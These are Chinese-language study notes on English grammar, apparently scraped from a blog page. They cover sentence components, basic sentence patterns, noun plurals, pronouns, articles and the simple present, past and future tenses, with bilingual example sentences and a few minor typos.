西 娶 楚 词- p t k f s θ ʃ tʃ tr ts 浊辅音 博 无 日 热 鱼 脚儿 煮 子- b d g v z ð ʒ dʒ dr dz 鼻音 模 音 m n ŋ 似拼音 儿 h r l 半元音 乌 野 w j 划分音节 12345671. 一个元音 a [ei, ə]2. 元音+ 辅音 an [æn; ən] in3. 辅音+元音 he [ h i] 4. 辅音+ 元音+ 辅音 Good [ g u d]有多少元音就有多少音节1.从左到右去拼2.一定 辅音跟元音拼 句子成分主语、谓语、表语、宾语、宾补语、定语、状语 、同位语。 主语 12345678910主语一句话的主体就是主语。可以做主语的词语有: 名词、代词、数词、动词不定式、动名词、句子、其他。 主语= 名词 人称代词。 主语 人称代词 i you she he it they we Nick is teacher (Nick人名做主语)The book is expensive 这本书很贵(普通名词book作主语)English is easy (专有名词English 作主语)This is my pen 人称代词This做主语 谓语 1234567891011121314 谓语= 说明主语的动作或者状态 动作型谓语和状态型谓语在英文里面。任何句子都必须有谓语 状态型谓语 系动词be + 表语 不能分割的。 系动词主要有&quot;be&quot; 充当，be是一个非常重要，也是非常特殊的词语。Be有八种形式 &quot;be、am、is、 are 、 was 、were 、being、 been &quot; 但是他们意思相同。&quot;是&quot;的意思 有时候在中文里面是不翻译出来的。 系动词后面的就是表语 我是英语老师。 是状态型谓语我每天吃一个苹果 是动作型谓语I am happy 状态型谓语。You are cool 状态型谓语I work every day 我每天工作根据谓语定义: &quot;work&quot;就是说明主语&quot;I&quot; 做的动作，所以动词&quot;work&quot;就是谓语 表语 123456789101112I am happy . 我快乐。 这里&quot;是&quot; 就不用翻译出来am 系动词 happy 是形容词作表语。 表语其实就是属于谓语的范畴。但是不能说表语就是谓语。因为&quot;系动词+表语&quot;才是谓语。系动词和表语是不能分开的。没有系动词就没有表语。没有表语就没有系动词。表语的定义跟状态型谓语是一样的。说明主语是什么或者怎么样的词语就是表语。也可以说是说明主语的情况或者说明主语的状态的词语。总之 。系动词后面的就是表语名词、形容词、介词短语、名词所有格、动词不定式、动名词、代词、数词分词、副词、句子都可以做表语。I am rich rich作表语You are busy busy 做表语 宾语 123456789101112宾语就是动作的对象或承受着，英语的实义动词分为及物动词和不及物动词。及物动词后面一定要跟一个动作的对象或者承受者，也就是宾语。如果没有宾语，这些及物动词就没有意义了。或者意思不完整。 比如 我买。需要加个承受者。书或者水果。我买水果。水果就是宾语了。及物动词后面的词语 名词代词和数词，动词不定式短语，动名词短语都可以做宾语。 但是人称代词做宾语必须用宾格，不能用主格。 双宾 有些及物动词后面可以跟两个宾语。这两个宾语一个叫直接宾语。另一个叫间接宾语。一般来说。表示人的叫间接宾语。表示物的叫直接宾语。比如 I gave her a book 我给她一本书 her间接宾语。 book 直接宾语。 主语 人称代词 i you she he it they we 宾语 人称代词 me 我 you 你 你们 her 她 him 他 it 它 them 他们/她们 us 我们 宾补 1234567有些动词加上宾语之后。意思还是不完整，不如下面的动词make (使,让) let (让) get (让) have (让，使) find (发现)call (叫， 称为) see (看见) keep (保持) put (放)这个时候。就需要加上一个词语补充宾语的意思，是整个句子意思完整，这个补充宾补的词语就叫宾语补足语。简称 宾补。例如： I make you ( 我让你，我使你)，意思不完整。但是。加上一句 happy (快乐的)，就完整了。I make you happy ( 我让你快乐。) 这个happy 就是宾补。注意: 宾补只跟宾语有关系。 状语 123状语就是说明谓语的情况 ，状语只和谓语有关系，修饰谓语。状语分为：时间状语、地点状语、方式状语、原因状语、目的状语等等。状语一般有副词，介词短语充当。如In beijing 在北京 介词 定语 12345678910111213141516171819202122 修饰或限定名词的词语叫定语。定语只跟名词有关系。(这个很特殊，跟其他任何句子成分都没有关系)。哪里有名词，哪里就有定语。 不管在什么语言里面，名词都需要定语的(特殊情况除外)。 如果没有定语，名词的范围就太广了。意思就不清楚了。比如说：你去帮我买苹果。这句话是有问题的。因为苹果这个名词，没有定语，概念太广了。表示世界上所有的苹果。 加个定语意思就清除了。 你去帮我买十个苹果。&quot;十个&quot;就是修饰名词的定语。放在名词前面的是前置定语 7种前置定语形容词性物主代词、形容词、名词所有格('s)、数词、名词、量词、指示代词等。1.形容词性物主代词作前置定语:my book 我的书。our teacher 我们的老师2.形容词作前置定语:expensive book 贵的书good book 好的书。happy girl 快乐的女孩3.名词所有格('s)作前置定语:Nick's house 尼克的房子后置定语 放在名词后面的。由介词短语、名词所有格(of + 名词)、动名词短语、动词不定式短语。句子构成。The people in the park are dancing 在公园里面的人正在跳舞in the park是后置定语。修饰名词people 同位语 123同位语的意思就是，两个不同的词语都表示同一个事物或人，同位语起到强调补充说明的作用，如： my father , the fat man, is drinking 我爸爸， 哪个胖的男人，正在喝酒my fater 和 the fat man 都指向同一个人。所以 the fat man 就是 my father 的同位语。 五个基本句型12345678910111213141516171819202122232425262728293031323334353637381. 主语+ 谓语(不及物动词) + 状语(表示动作) 1) I work ervery day. 我每天都工作work 是不及物动词作谓语， ervery day 是时间状语。 2) I live in Guangdong Huizhou city. 我住在广东惠州市2. 主语 + be(系动词) + 表语 + 状语(表示状态) 1) She is rich now 她现在很富有。 rich 是形容词作表语 now是时间状语。 2) I am in Guangdong now 我现在在广东。 In Guangdong 是介词短语做表语。 Now 是时间状语。3. 主语 + 谓语(及物动词) + 宾语 + 状语(表示动作) 1) I read English every morning. 我每天早上读英语 read 是及物动词作谓语 ，English 是名词做宾语。 every morning 是时间状语。 2) She learns English very hard 她很努力学英语 4. 主语 + 谓语(及物动词里面的双宾动词) + 双宾语 + 状语(表示动作) 1) I gave her a book yesterday. 我昨天给了她一本书。 gave 及物动词作谓语 。her 是间接宾语 。book 是直宾语。 yesterday 时间状语 5. 主语 + 谓语(少数特定的及物动词) + 宾语 + 宾补 + 状语(表示动作) 1) I made her happy yesterday. 昨天 我让她开心 made 是及物动词做谓语 her 做宾语 happy 是形容词作宾补， yesterday 时间状语。 2) Her father 大分为两种句型1.状态型的: 主语 + be(系动词) + 表语 + 状语(表示状态)2.动作型的: 主语 + 谓语 + 宾语 + 状语(表示动作)今天天气很好= 状态的句子我每天都很开心=状态的句子我每天都学英语= 动作的句子她经常买衣服= 动作的句子。我喜欢英语=动作的句子I like EnglishDo you like English? 动作型疑问句Are you a teacher? 状态型疑问句 名词12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788名词的定义: 世间万物的名称.名词的分类: 普通名词和专有名词专有名词: 人名。地名。专门机构组织。术语。第一个字母要大写普通名词: 普通名词又分为可数名词和不可数名词。 可数名词: 可数名词就是那些肉眼可以分清数量的名词。比如: 书，房子，手机，电脑等等。 不可数名词: 不可数名词刚好相反，就是肉眼分不清数量的名词。比如大部分液体:水、牛奶、酒、茶、咖啡等。还有头发。砂、肉、大米等等。每个可数名词都有两种格式: 一个是单数的格式。另一个是复数的格式。复数的格式都是由单数变化而成的。有规则的变化和无规则变化。大部分名词单数变复数都是有规则的变化。下面就是有规则的变化规律:一、可数名词单数变复数的规律:1. 大部分可数名词变复数，在词尾+ s。pen 钢笔 penscup 杯子 cups2. 当可数名词是以字母s 、sh 、x 、 ch 结尾的单词，变复数要+ es 如:单数 复数box 箱子 boxeskiss 吻 kisseswatch 手表 watchesbrush 刷子 brushestoothbrush toothbrushes牙刷bus 汽车 buses有一个例外的单词: stomach 复数stomachs 胃。复数形式直接+ s3. 辅音字母+y结尾的名词，去 y 变 i+es 英语有26个字母，其中有5个元音字母。分别是&quot; A U I O E &quot; 。除了这五个元音字母，其他的21个字母的都是辅音字母。当一个可数名词是有“辅音字母+y结尾的。那么变成复数的时候。就要把这个&quot;y&quot;变成&quot;i&quot;,再加上&quot;es&quot;, 比如: city 这个单词 't'是辅音字母，后面还有一个&quot;y&quot; ,所以&quot;city&quot;的复数就是&quot;cities&quot; 单数 复数 baby 婴儿 babies country 国家 countries story 故事 stories dictionary 字典 dictionaries 例外: 如果是元音字母加y结尾的单词，就不用变化了。直接加s变复数。如: 单数 复数 toy 玩具 toys boy 男孩 boys day 日子，天 days 4. 当可数名词是以字母f或者fe结尾的单词，去f或者fe 变v 再+es 如:单数 复数wife 妻子 wivesknife 小刀 knivesthief 小偷 thievesleaf 叶子 leaveswolf 狼 wolves例外: roof-roofs 房顶 gulf-gulfs 海湾 cliff-cliffs 悬崖5. 辅音字母+o 结尾的可数名词变成复数也是+ es ,如:单数 复数tomato 西红柿 tomatoespotato 土豆 potatoeshero 英雄 heroes这类词语很少。常见的就是上面几个。可以通过下面的句子来记:Heroes like tomatoes and poptaoes (英雄喜欢吃西红柿和土豆)例外: 很多元音字母+ o 结尾的可数名词或者以o结尾的外来词、简写词都是直接加's'，如:单数 复数bamboo bamboospiano 钢琴 pianosradio 收音机 radiosphoto 相片 photosvideo 视频 videosstudio 工作室 studios二、 可数名词不规则变化: 不规则的变化是少数的。有一种误区，就是不规则变化要死记硬背。这些不规则的变化，死记是没有什么效果的，因为如果不去运用这些名词的复数，是很难记住的。就是暂时记住了。过几天也会忘记。所以最有效的方法。就是拿这些名词的复数来造句。单数 复数Man 男人 men mouse 老鼠 micegoose 鹅 geeseox 牛 oxen child 小孩 children有些可数名词，单复数都是相同的。Deer 鹿 sheep 绵羊 Chinese 中国人 Japanese 日本人 Vietnamese 越南人 Lebanese 黎巴嫩人Portuguese 葡萄牙人。有些可数名词，只有复数的形式，没有单数的形式。称为复数名词，如:People 人们 police 警察 public 公众 clothes 衣物 cattle 牛 (总称)person 人(单数) 量词的构成方式有两种 12345678910111213141516171819不可数名词不能用数词来表达数量。要用量词 来表达数量 比如: 一杯水 a cup of water1. A/an/one +可数名词单数 + of 比如: a cup of 一杯a bucket of 一桶A tin of 一罐A truck of 一卡车A bowl of 一碗2. 数词+可数名词的复数+ of 比如: 2以上的数词，并且包括2two bottles of 两瓶three tins of 三罐注意。量词里面的of 是没有意思的，不用跟后面的名词所有格里面的of 混淆。另外。量词也是可以修饰可数名词的复数，但是不能修饰单数，比如: a basket of apples 一篮子苹果a box of books 一箱书 名词所有格 123456789101112131415必须用名词构成 代词不行。比如:you's错的。he's也是错。代词有专门的物主代词:英文的名词所有格有两种: 第一:用 's 构成，有生命的名词+'s 表示人名的名词+'s人名或者表示身份，职业的普通名词(可数名词规则)Nick's the teacher's表示动物的名词+ 's第二:of + 无生命的名词，(可数名词规则)Of the house 这个房子的Of oil 油的Of his house 他的房子的The center of the city 这个城市的 中兴 代词12345678910111213141516171819202122232425262728293031323334代词的定义 代词是为了避免重复而用来代替名词的词语。英语代词可分为以下九类: 人称代词、物主代词、反生代词、相互代词、指示代词、不定代词、疑问代词、连接代词和关系代词。大多数代词具有名词和形容词的作用。代词的使用频率很高。而且种类很多。有些代词比较复杂。 先了解三种代词： 人称代词、物主代词、指示代词。人称代词：就是中文的 我、你、他、她、它、我们、你们、他们、她们、它们(英文的they 和them 就包含了中文的: 他们 她们 它们)，注意: 其实it 和 they,them 可以代替物。英语的人称代词有两种格式，而中文只有一种。这两种格式就是主格和宾格。1.主格 I You She He It We They 我 你/你们 她 他 它 我们 他们 她们 它们2.宾格 Me You Her him It Us Them 我 你/你们 她 他 它 我们 他们 她们 它们 物主代词: 表示所有关系的代词叫物主代词。物主代词包括形容词性物主代词和名词性物主代词。 1. 形容词性物主代词: my your her his its our their 我的 你的/你们的 她的 他的 它的 我们的 他们的/她们的/它们的 这是我的书 this my book 形容词性物主代词 2. 名词性物主代词 mine yours hers his its ours theirs 我的 你的/你们的 她的 他的 它的 我们的 他们的/她们的/它们的 你的书比我的贵 your book is more expensive than mine mine代表我的书。名词性物主代词指示代词: 指示代词也很容易掌握。只有两个 this 和 that 还有它们的复数: these和 those 单数 复数 This 这个 These 这些 做主语be 动词用is 做主语be动词用are That 那个 Those 那些 be动词用is be动词用are 指示代词可以作: 主语、宾语、表语、定语。其中做主语和定语最常见。 形容词1234567891011形容词是一个很重要的词语。使用频率很高。数量也多(排在数词和名词的后面)。形容词分为两种: 1.普通形容词beautiful big green happy long cheap angry sad 漂亮的 大的 绿色的 快乐的 长的 便宜的 生气的 伤心的 2. 复合形容词复合形容词是中文没有的概念。复合形容词是由两个单词构成的一个新的单词。这个新词也是属于形容词性。两个单词之间有一个符号&quot;-&quot;,sky-blue good-looking man-made second-hand warm-hearted hard-work天蓝色的 好看的 人造的 二手的 热心的 努力的 形容词的用法 1234567891011121314151617181920212223形容词的用法不多。一般可以作定语，表语和宾补。1.作表语 大部分的形容词都可以作表语。形容词作表语可以直接构成一个句型: 主语 + be (系动词) + 形容词(表语) I am happy /busy 我快乐/我忙。 You are rich 你是有钱的。 She is busy 她忙 (形容词busy 作表语) 2.作前置定语 大部分形容词都可以做前置定语，修饰普通名词，放在普通名词的前面。 The big House 这个大房子 (形容词big 作前置定语修饰名词house) My small house 我的小房子 A happy girl 一个快乐的女孩儿 形容词两个作用 作表语 能直接造句！ 作前置定语 不能直接造句，只能修饰一个普通名词，构成短语！ 3.作宾语补足语 形容词可以作宾补，但是只有部分特定的及物动词后面才可以跟形容词作宾补。比如: Make (使 让) keep (保持) prove(证明)等等。 I make you busy 我让你忙 I make you rich 我让你有钱 We keep the room clean 我们保持房间干净 动词 12345678动词分为：谓语动词和非谓语动词谓语动词又分为: (1)及物动词 (1)实义动词 ----&gt; (2)不及物动词谓语动词 ----&gt; (2)系动词 (3)情态动词 (4)助动词非谓语动词 冠词1234567891011121314151617181920冠词是一种虚词，没有词义，没有数和格的变化。不能单独使用，只能帮助名词或起名词作用的其他词类说明其意义冠词分为定冠词'the (这，这些)' 和不定冠词'a, an (一)' 两大类。&quot;a,an&quot;都是不定冠词，都表示同一个意思。只是'a' 用在辅音(指发音)开头的名词或其他词语前面。读[ə]; &quot;an&quot;是用在以元音开头的名词或其他词语前面，读[ən],如: a book 一本书 a university 一所大学 an apple ['æpəl] 一个苹果 an hour 一个小时 an egg 一个鸡蛋定冠词&quot;the&quot;的用法1. 在普通单数名词前指一类人或者事物，不必翻译，跟不定冠词的第二种用法一样，如:The ear is an organ for listening 耳朵是听的器官The fox is a cunning animal 狐狸是狡猾的动物。2. 在重新提及的人或事物前，含有&quot;这，这些&quot;的意思，可以修饰可数名词单数，复数也可以修饰不可数名词。如: I bought a book yesterday. The book is interesting. 我昨天买了一本书。这本书很有趣。 I know a friend. The friend is a doctor. 我认识一个朋友。这个朋友是一个医生。 特指名词。 英语时态 1234567891011121314151617时态是英语语法的一大特色，也是和中文语法的最大区别时态的定义: 作谓语的动词用来表示动作发生或状态存在时间的各种形式称为时态。例如: 我昨天买了一本书 I bought a book yesterday我明天要买一本书 I will buy a book tomorrow我每天买一本书 I buy a book every day 通过对比。发现，中文和英文的时间状语都要发生变化，但是中文的动词没有发生变化，都是&quot;买&quot;,而英文的谓语动词发生了变化 &quot; bought&quot;、&quot;will buy&quot;、 &quot;buy&quot; ,另外，中文的时间状语放在中间。而英文的时间状语放在句尾。 时态其实就是一个谓语动词随着时间的变化而发生的不同形态变化，所以简称时态。发生在过去的变化就叫做过去时态。在将来的时间发生的变化，叫做将来时态。英语有16种时态，常用的有10种。一般现在时态，一般过去时态，一般将来时态，现在进行时态，现在完成时态，过去完成时态，过去将来时态，过去进行时态，现在完成进行时态，将来进行时态。其他6种比较少用。并且主要出现在书面语用。五种常用时态： 一般现在时态，一般过去时态，一般将来时态，现在进行时态，现在完成时态。时态是英语语法中的一个重点内容。 1.一般现在时态(1)状态型句型 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384为了更方便学习造句，可以先把主语+be+表语这个句型分成四个更具体详细的小句型:1.人称代词主格(主语) + is/are/am +形容词(表语)2. 名词(主语) + is/are +形容词(表语)3. 人称代词主格(主语) + is/are/am + 名词(表语)4. 名词(主语) + is/are + 名词(表语)首先，学习第一个小句型:一、人称代词主格(主语) + is/are/am +形容词(表语)只要记住下面的搭配就可以了。I am You are She is He is It is We are they are 掌握了以上的搭配，就只剩下形容词作表语的问题。例如: I am happyYou are happy She is happy We are happyThey are happyHe is busy 二、名词(主语) + is/are +形容词(表语)用名词做主语，继续用形容词当表语，不过，因为只有&quot;I&quot; 才能用&quot;am&quot;，所以名词作主语只有系动词&quot;is&quot;和&quot;are&quot;。 虽然可以说名词单数用is ,名词复数用are，但是具体的情况还是比较麻烦，下面用具体情况说明is 和are的使用情况:第一种情况： 专有名词里面的人名和地名作主语的时候，一个人名或一个地名做主语用is 比如:Nick is busy 尼克忙。Nick is famous. 尼克出名。Guangxi is famous 广西出名。Beijing is big 北京大如果是并列的人名或者地名做主语。则用are:Nick and Jack are busy 尼克和杰克都忙Guangzhou and Beijing are big 第二种情况: 可数名词单数作主语,用 is .但要注意可数名词单数不能单独使用，要考虑加限定词或冠词。The student is happy 这个学生开心。My student is rich 我的学生有钱。第三种情况: 可数名词复数作主语。用are， 可数名词复数直接作主语，强调泛指，如果特指，依然需要考虑加定冠词或限定冠词。Teachers are busy 老师忙 (泛指大部分老师)The teachers are busy 这些老师忙。(特指这些老师)第四种情况: 不可数名词做主语。也是强调泛指。Water is important 水是重要的(泛指大部分水)Oil is expensive 油贵。三、人称代词主格(主语) + is/are/am + 名词(表语)使用名词做表语。第一种:人名I am Nick. 我是尼克She is Jenny 她是杰妮第二种：名词表里的表示职业身份的。I am a doctorShe is a nurseThey are teachers五、 主语+be+表语 句型在一般现在时态里面变成否定句的规则。只要在肯定句be(is/are/am)后面加个否定词&quot;not&quot;就可以了。&quot;is not&quot;和are not 可以缩写为&quot;isn't和&quot;aren't&quot;,例如:肯定句: I am a teacher 我是老师否定句: I am not a teacher 我不是老师。肯定句: She is pretty 她漂亮否定句: She is not/isn't pretty 她不漂亮You are great 你伟大You are not great 你不伟大。六、 主语+be+表语 句型在一般现在时态里面变成一般疑问句的规则。只要把肯定句里面的be(is/are/am)移到句首，加个问号就可以了。不过有时候要根据实际情况。把主语的人称改变一下，因为人称改变了。be(is/are/am)也要根据人称的变化而发生变化。如:肯定句: I am a teacher 我是老师疑问句: Are you a teacher? 你是老师吗?(注意，一般不说，Am I a teacher? 不会自己问自己的。因为主语人称发生了变化，主语换成了you,系动词跟着变化成are)肯定回答: yes, I am 是的，我是否定回答: no, I am not 不，我不是。肯定句: She is pretty. 她漂亮疑问句: Is she pretty? 她漂亮吗?肯定回答: yes,she is 是的，(她漂亮)否定回答: no,she is not(isn't)不，(她不漂亮)肯定句: These apples are cheap 这些苹果便宜疑问句: Are apples cheap? 这些苹果便宜吗?主语+be+表语 一般现在时态里面就是be的变化is am are 主语 决定 be 的格式变化。 2.一般现在时态 主语+谓语+宾语 (2)动作型句型 非第三人称单数 123456789101112131415161718192021222324252627282930一、 人称代词主格(主语)+ 不及物动词(谓语)+状语这个小句型只有主语是人称代词‘I/we/you/they’的时候才属于非第三人称单数。they为第三人称复数不是单数。所以这个句型还可以归纳为:I/we/you/they/+不及物动词原型+ervery day 只要从&quot;I/we/you/they&quot;这四个人称代词主格里面任意挑一个作主语，然后再从动词表里面随便挑一个不及物动词原型作谓语，再加一个简单的时间状语&quot;every day&quot; 就可以构成一个简单的一般现在时态动作性的句子。比如:I sleep every day 我每天睡觉。五、 &quot;主语(非第三人称单数)+ 谓语 + 宾语&quot;这个句型在一般现在时态里面变一般疑问句的规则只需要在肯定句的句首前面加一个助动词&quot;do&quot;,&quot;do&quot;在这里是助动词，没有意识，只是帮助构成疑问句。注意有时候根据逻辑，需要改变一下主语的人称。肯定句: I read books every day. 我每天读书疑问句: Do you read books every day? 你每天读书吗?肯定回答: yes, I do 是的。我读否定回答: no, I don't 不，我不读。肯定句: I work every day, 我每天工作疑问句: do you work every day? 你每天工作吗?肯定回答: Yes,I do 是的。否定回答: no ,I don't 不肯定句: I speak Cantonese/Mandarin, 我讲广东话/普通话疑问句: Do you speak Cantonese/Mandarin 你讲广东话/普通话吗?六、 &quot;主语(非第三人称单数) + 谓语 + 宾语&quot; 这个句型在一般现在时态里面变否定句的规则。只需要谓语动词前面加助动词&quot;do&quot; 的否定式&quot;do not&quot; 或缩写形式&quot;don't&quot;即可。肯定句: I read books every day. 我每天读书否定句: I don't read books every day 我每天不读书肯定句: I work every day 我每天工作否定句: I don't work every day 我每天不工作。 3.一般现在时态 (3)动作型句型 第三人称单数 1234567891011121314151617181920212223242526272829303132主谓宾第二种构成方式: 当主语是第三人称单数的时候。谓语动词要变成第三人称单数的格式。所谓第三人称单数，就是:不是&quot;我&quot;,不是&quot;你&quot;,而是第三种(人或者物)，并且一定是一个单数。your father 你的父亲，也是属于第三人称单数。大概什么词语做主语属于第三人称单数1. 人称代词主格: she , he, it 2. 所有的名词的单数: train,bus ,father, mother doctor 3. 一个人名/一个地名，都是第三人称单数: Nick, Jack, Guangxi4. 不可数名词也是第三人称单数: water,sugar,wine5. 指示代词 this, that 也是第三人称单数6. 动词不定式和动名词短语7. 主语从句一、 人称代词主格(第三人称代词)+ 不及物动词小三格式(谓语) + 状语这个小句型里面的人称代词主格只有&quot;she/he/it&quot;属于第三人称单数，然后谓语的不及物动词直接从动词表里面挑选。不及物动词的第三人称单数格式，动词规则自己加上s或者es变第三人称单数格式，时间状语可以先用every day .She bathes every day 她每天洗澡He works every day 他每天工作It sleeps every day 它每天睡觉。第三人称疑问句 这时候动词要变成原型。肯 定 句: She likes playing Pingpong 她喜欢打乒乓球一般疑问句: Does she like playing Pingpong? 她喜欢打乒乓球吗?肯定回答: yes , she does 是的，她喜欢否定回答: no , she doesn't 不，她不喜欢肯定句: He has a cat. 他有一只猫疑问句: Does he have a cat? 他有一只猫吗?肯定句: My father like wine. 我爸爸喜欢喝啤酒疑问句: Does your father like wine? 你爸爸喜欢喝啤酒吗? 一般现在时态的用法 12345678910111213141516171819202122232425262728293031323334353637383940首先，我们要知道。什么时候需要使用一般现在时态的规则造句。 当表示经常性，习惯性，有规律性的动作和状态的时候需要使用一般现在时态， 表示真理性，客观性的动作和状态也要使用一般现在时态的规则造句。(如：地球是圆的，太阳从东边升起，1+1=2) 另外，还有两种情况也要使用一般现在时态。第一种就是:不轻易改变的状态，比如，他是一个男孩，再比如，这个房子很大。像这样的句子都要使用一般现在时态。第二种就是: 此时此刻的状态。比如:我现在很累(I am tired now).一般现在时态的时间状语一般现在时态的时间状语都是表示规律性，经常性，习惯性词语，比如:every day 每天 every week 每周 on Sunday 在周日 in the morning 在早上She gets up very late on Sunday 在周日，她很晚才起床。I get up at 9:00 every morning 我每天早上9点起床表示时间的名词分别是:second minute hour Morning noon afternoon evening nightday/year week Month seasonEvery night 每晚 every evening 每天傍晚 every minute 每一分钟。I miss you every second We are happy every day另外，一般现在时态的时间状语也可以由频度副词充当。 下面是常用的频度副词Always often usually sometimes Seldom occasionally never总是 经常 通常 有时候 很少 偶尔 从不不过这些频度副词作时间状语的时候不是放在句尾，而是放在中间，并且有一定的规则，频度副词的位置1. 放在be，助动词，情态动词后面。I am often late. 我经常迟到。She is always hard-working. 她总是很努力Do you always get up late? 你总是起床很晚吗？2. 放在实义动词前面I never drink wine 我从来不喝啤酒。I often play basketball 我经常打篮球。 一般过去时态123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123用在表示 过去发生的动作和状态的句子里面。一般过去时态使用范围非常广，因为我们说话的时候，经常聊过去的事情。故事，小说，新闻里面，也需要用一般过去时态。一、一般过去时态状态的句子构成方式主语+be+表语 句子在 一般过去时态里面构成的方式很简单，就是把里面的&quot;be&quot;变成&quot;was&quot;,&quot;were&quot;。当主语是&quot;I&quot;或者单数的时候就用&quot;was&quot;;当主语是&quot;you&quot;或者复数的时候就用&quot;were&quot;。主语和表语都不需要发生变化。1.人称代词主格(主语) + was/were(be) + 形容词(表语)2.名词(主语) + was/were(be) + 形容词(表语)3.人称代词主格(主语) + was/were(be)+ 名词(表语)4.名词(主语) + was/were(be) + 名词(表语)首先，了解第一个小句型人称代词主格(主语) + was/were(be) + 形容词(表语) + 过去时间状语(bofore/yesterday 先用这两个示范)。记住下面的搭配就可以了。I was She was he was It was You were we were They were掌握了以上的搭配，就剩下形容词作表语的问题了。I was thin before 我以前瘦。You were busy yesterday 你昨天很忙。She was beautiful before 她以前很漂亮。He was famous before 他以前很出名。You were beautiful before 你以前很漂亮。It was cheap before 它以前很便宜。(这个东西之前很便宜)2.名词(主语) + was/were(be) + 形容词(表语)Nick was thin before 尼克以前很瘦Beijing was clean before 北京以前很干净如果是两个人名或者地名并列做主语。就要用wereNick and Jack were handsome before 尼克和杰克以前很帅。3.人称代词主格(主语) + was/were(be)+ 名词(表语)I was a guide before 我以前是导游。You were my student before 你以前是我的学生4.名词(主语) + was/were(be) + 名词(表语) + 过去的时间状语Nick was a teacher before 尼克以前是一名老师。Nick and Jack were farmers before 尼克和杰克以前是农场主。二、 主语 + be + 表语 句型在一般过去时态里面变成否定句的规则。只要在肯定句be(was,were)后面加一个否定词not就可以了。 Was 和not和 Were not可以缩写为wasn't和weren't.肯定句: I was a teacher bofore 我以前是老师否定句: I was not/wasn't a teacher bofore 我以前不是老师。肯定句: She was pretty before 她以前很漂亮。否定句: She was not pretty before 它以前不漂亮。肯定句: You were great before 你以前很伟大否定句: You weren't great before 你以前不伟大三、 主语 + be + 表语 句型在一般过去时态里面变成一般疑问句的规则。只要把肯定句里面的be(was,were)移到句首，加个问号就可以了。肯定句: I was a teacher before 我以前是一名老师疑问句: Were you a teacher before? 你以前是老师吗?肯定回答: yes, I was 是的。我是否定回答: no, I wasn't 不。我不是。肯定句: She was pretty before 她以前很漂亮疑问句: Was she pretty before? 她以前很漂亮吗？肯定回答: yes, she was 是的否定回答: no, she wasn't 不四、 一般过去时态的时间状语。yesterday just now the day bofore yesterday before 刚才 前天 以前 I was hungry just now 我刚才饿了。I was speechless just now 刚才我无语了。an hour ago 一个小时前a year ago 一年前one year ago 一年前three days ago 三天前。a week ago 一个星期前。ten years ago 十年前。I was poor ten years ago 十年前我很穷。由介词&quot;in (在)&quot;构成。在in的后面加上一个表示过去年份的数词，in 2015=2015年in 1998=1998年由副词&quot;last(上一个)&quot;构成在副词last 后面加上表示时间的词语，构成方式：last+表示时间的名词单数。last hour 上一个小时last week 上周last day last month 上个月last year 去年last night 昨天晚上。I was tired last night 我昨天晚上很累。五、 主语+ 谓语+宾语 动作型句型I bathed last night 我昨晚洗澡了。You worked yesterday 你昨天工作。注意: 千万不要在动词过去式的前面乱加was/were ,根本没有这个规则。主谓宾和主系表句型不能混用。六、 主语+谓语+宾语 句型在一般过去时里面变成一般疑问句的规则在句首加助动词&quot;did&quot;,did无意义，只是帮助构成疑问句。另外一定要把谓语的过去式变回原型。肯定句: I worked before 我以前工作。疑问句: Did you work before? 你以前工作吗？肯定回答： yes, I did 是的否定回答: no, I didn't 不。肯定句: I read books yesterday 我昨天看书疑问句: Did you read books yesterday? 你昨天看书了吗？肯定回答： yes, I did 是的否定回答: no, I didn't 不。七、 主语+谓语+宾语 句型在一般过去时里面变成否定句的规则在谓语动词前面加助动词did的否定式didn't(did not的缩写)，另外同样把谓语动词的过去式变回原型。肯定句: I read books yesterday 我昨天看书否定句: I did not/didn't read books yesterday 我昨天没有看书。 一般将来时态1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162一般将来时态用在表示即将要发生的动作和状态的句子里面。 有两种构成方式。第一种是有助动词'will'构成，第二种是有助动词&quot;be going to&quot;构成，其实&quot;will&quot;和&quot;be going to&quot;是一样的，都是助动词，没有意思，作用也一样。一、一般将来时态状态的句子构成方式一般将来时态&quot;主语+be+表语&quot;的句子，只要把系动词be变成will be。be是原型。然后加上表示将来的时间状语。就可以了。主语和表语不需要发生变化。人称代词主格(主语) + will be +形容词(表语) + 时间状语名词(主语) + will be +形容词(表语) + 时间状语人称代词主格(主语) + will be +名词(表语) + 时间状语名词(主语) + will be +名词(表语) + 时间状语人称代词主格(主语) + will be +形容词(表语) + 时间状语I will be rich in the future 我以后是将会是有钱的。I will be busy tomorrow 我明天会很忙。二、 主语+ will be +表语 句型在一般将来时态里面变成一般疑问句的规则只要把助动词will移到句首，然后be的位置保持不变就可以了。肯定句: I will be a teacher next year 我明年要做老师疑问句: Will you be a teacher next year? 你明年将要做老师吗？肯定回答: yes, I will否定回答: no, I will not /won't三、 主语+will be + 表语 句型在一般将来时态里面变成否定句的规则。直接在will后面加not,一般缩写为&quot;won't, be的位置保持不变肯定句: I will be a teacher next year 我明年要成为老师否定句: I won't be a teacher next year 我明年不会成为老师。You will be beautiful tomorrow You won't be beautiful tomorrow四、一般将来时态动作句型构成方式。一般将来时态动作的句子，也就是 主语 + 谓语 + 宾语 ，只要在谓语动词原型前面加上will ,然后加上表示将来的时间就可以了。1.人称代词主格(主语)+will +不及物动词原型(复合谓语) +表将来的时间状语。I will travel tomorrow 我明天去旅游You will smile tomorrow 明天你会笑的She will rest tomorrow 明天她休息。He will run tomorrow 他明天跑步。动作型疑问句will he run tomorrow? 他明天跑步吗?Will you buy a house next year? 你明年要买一套房子吗?yes, I willno, I won't一般将来时态的时间状语tomorrow 明天 tonight 今晚 the day after tomorrow 后天 tomorrow morning 明天早上tomorrow evening 明天晚上。next week 下周 next year 明年 next Sunday 下周日。After 2022 2022年后After Sunday 星期天之后。In +一段时间后(...之后):这里的in表示在....之后。in five days 五天之后in ten years 十年之后。We will buy the house in 2082 我们会在2082年买这个房子。 一般将来时态的第二种构成方式 123456一般将来时态的第二种构成方式是由助动词&quot;be going to&quot;来构成。&quot;be going to&quot;就等于&quot;will&quot;， 不要把&quot;be going to&quot;当作三个单词，“be going to”只是一个词语。只是一个助动词。Be going to 和will 有一点不同。be going to 有三种形式，分别是:am going to , is going to 和are going to 主要根据主语的人称或单复数的不同，而使用不同的形式。 当主语是I的时候用&quot;am going to&quot; 